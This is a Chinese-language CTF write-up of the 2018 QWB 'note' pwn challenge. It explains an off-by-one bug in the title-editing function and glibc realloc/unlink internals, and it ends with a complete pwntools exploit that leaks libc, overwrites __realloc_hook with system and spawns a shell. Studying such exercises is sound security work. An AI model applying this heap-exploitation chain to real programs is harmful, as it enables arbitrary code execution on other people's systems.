# 2018强网杯--pwn-note

不知道为什么运行不了note，只能借别的师傅的writeup来云做题

checksec

```
	Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fd000)
    RUNPATH:  '/home/pur3uit/build/build-2.25/lib/'
```

ida打开

```c
void sub_401270()
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  alarm(0x3Cu);
  qword_602070 = (__int64)malloc(40uLL);        //title
  printf("welcome to the note %d\n", qword_602070 - qword_602078);
  dword_602068 = 120;
  ptr = (char *)malloc(0x78uLL);
  qword_602058 = (__int64)malloc(0x78uLL);
  dword_602050 = 0;
  while ( 1 )
  {
    switch ( (unsigned int)sub_401076() )
    {
      case 1u:
        Changetitle();
        break;
      case 2u:
        ChangeContent(120LL);
        break;
      case 3u:
        Changecomment(120LL);
        break;
      case 4u:
        ShowContent(120LL);
        break;
      case 5u:
        puts("Bye~");
        exit(0);
        return;
      case 6u:
        exit(0);
        return;
      default:
        continue;
    }
  }
}
```

漏洞在changetitle，off-by-one

```c
__int64 Changetitle()
{
  __int64 result; // rax
  signed int v1; // eax
  unsigned __int8 v2; // [rsp+Bh] [rbp-5h]
  signed int v3; // [rsp+Ch] [rbp-4h]

  printf("enter the title:");
  v3 = 0;
  while ( 1 )
  {
    v2 = getchar();
    if ( (unsigned int)sub_401090(v2) )         // v3=40时利用'!?@"',27h,'#&',0跳出，@刚好就是0x40
      break;
    if ( v3 > 39 )
    {
      result = qword_602070 + 39;
      *(_BYTE *)(qword_602070 + 39) = 0;
      return result;
    }
    v1 = v3++;
    *(_BYTE *)(qword_602070 + v1) = v2;
  }
  result = v2;                                  // title[40]=v2,有一个字节溢出
  *(_BYTE *)(v3 + qword_602070) = v2;
  return result;
}
```

## realloc

1：检查下一块是否是top chunk，如果是并且top chunk的size满足要求，则直接到top chunk中进行扩展原先的内存。
2：如果第一步不能满足，则检查下一块是否是空闲的chunk，如果是并且size满足要求，则从下一个chunk中进行扩充。
3：如果前两步都不能满足，就只能通过malloc申请新的内存空间，如果新申请的内存是原先内存的下一个chunk，则不进行复制，释放原内存的操作，直接将两块内存合并；如果新申请的内存不是原先内存的下一个chunk，就需要进行复制，释放原先内存的操作。

在第三步进入malloc操作的时候，如果申请的内存过于大，以至于small bins中没有合适的内存块可以供使用，就会触发malloc_consolidate操作，这个操作会将fast bins中的所有chunk都取出来并进行合并。
上文，realloc操作的第三步，会对原先的内存进行free操作，如果原先的内存是属于fast bins的，结合这里的malloc_consolidate操作，会触发unlink操作。



## RELRO技术就是重定位只读技术，主要是为了防御针对修改GOT表的攻击。

重定位只读分为部分RELRO(Partial RELRO)与完全RELRO(Full RELRO)两种。

部分RELRO:在程序装入后,将其中一些段(如.dynamic)标记为只读,防止程序的一些重定位信息被修改。
完全RELRO:在部分RELRO的基础上,在程序装入时,直接解析完所有符号并填入对应的值,此时所有的GOT表项都已初始化,且不装入link_map与_dl_runtime_resolve的地址(二者都是程序动态装载的重要结构和函数)。

可以看到,当程序启用完全RELRO时,传统的GOT劫持的方式也不再可用。
但完全RELRO对程序性能的影响也相对较大,因为其相当于禁用了用于性能优化的动态装载机制,将程序中可能不会用到的一些动态符号装入,当程序导入的外部符号很多时,将带来一定程度的额外开销。
为了绕过RELRO，我们可以利用__realloc_hook的特性。
修改存在于glibc.data段的记录hook函数的指针变量__realloc_hook，若glibc发现此变量的值不为0，则在进行realloc操作时会直接调用此变量中记录的函数地址，从而达到劫持控制流的目的。

## 利用思路

查看bss段

```
.bss:0000000000602050 change_content_limit dd ?               
.bss:0000000000602050                                         
.bss:0000000000602054                 align 8
.bss:0000000000602058 ; char *comment
.bss:0000000000602058 comment         dq ?                    
.bss:0000000000602058                                         
.bss:0000000000602060 ; char *content_ptr
.bss:0000000000602060 content_ptr     dq ?                    
.bss:0000000000602060                                         
.bss:0000000000602068 default_content_size dd ?               
.bss:0000000000602068                                         
.bss:000000000060206C                 align 10h
.bss:0000000000602070 ; char *title
.bss:0000000000602070 title           dq ?                    
.bss:0000000000602070
```

为了触发unlink，我们需要两个连续的free chunk，通过调试可以发现，title正好是content的前一个chunk。

### 第一步 在title处伪造free chunk

fd和bk值为title指针减24和减16，并利用off-by-one把下一个chunk的标志位0

### 第二步

在change_content操作中，可以先通过申请一个很大的内存，使得realloc必须执行上文的第三步，这样会使得原先的content被free掉，成为free状态的fast bin chunk。
上面申请的大内存必定和top chunk相邻，因此，这一步也需要再申请一个足够大内存，其大小必须大于top chunk和当前content的大小之和，由于这时fast bin中已经有内容，所以会触发malloc_consolidate操作，对fast bin进行合并，这时就会触发unlink，使得title指针指向了其自身减去24的位置，此时便可以实现任意地址写。

exp：

```python
from pwn import *
import time
p = remote('127.0.0.1',1234)

def title(Title):
    p.recvuntil('option--->>\n')
    p.sendline(str(1))
    p.recvuntil('enter the title:')
    p.send(Title)

def content(Size,Content):
    p.recvuntil('option--->>\n')
    p.sendline(str(2))
    p.recvuntil('Enter the content size(64-256):')
    p.sendline(str(Size))
    p.recvuntil('Enter the content:')
    p.send(Content)

def comment(Cmn):
    p.recvuntil('option--->>\n')
    p.sendline(str(3))
    p.recvuntil('Enter the comment:')
    p.send(Cmn)

def show():
    p.recvuntil('option--->>\n')
    p.sendline(str(4))

def exploit():
    payload = p64(0)+p64(0x20)+p64(0x602070-0x18)+p64(0x602070-0x10)+p64(0x20)
    content(0x68,'A'*0x38+p64(0x41)+'\n')
    title(payload+'@')

    content(0x5000,'this step is to free one original content chunk\n')
    time.sleep(0.5)
    content(0x20000,'this step is to unlink\n')
    time.sleep(0.5)

    title(p64(0x602050)+p64(0x601fd0)+'\n')
    show()
    p.recvuntil('The content is:')
    libc.address = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))-libc.symbols['atoi']
    print('The libc base address is:' + hex(libc.address))
    __realloc_hook = libc.symbols['__realloc_hook']
    print('The realloc_hook address is:'+hex(__realloc_hook))
    system = libc.symbols['system']
    print('The system address is:'+hex(system))
    binsh_addr = next(libc.search('/bin/sh'))
    print('The binsh address is:'+hex(binsh_addr))

    #这一步会使得之后调用realloc变成调用system
    title(p64(__realloc_hook)+'\n')
    time.sleep(0.5)
    comment(p64(system)+'\n')
    time.sleep(1)

    title(p64(0x602050)+p64(binsh_addr)+'\n')
    time.sleep(1)
    comment(p64(0)+'\n')
    time.sleep(0.5)

    p.recvuntil('option--->>\n')
    p.sendline(str(2))
    p.recvuntil('Enter the content size(64-256):')
    p.sendline('0x100')

libc = ELF('/home/pur3uit/build/build-2.25/lib/libc.so.6')
exploit()
p.interactive()
```

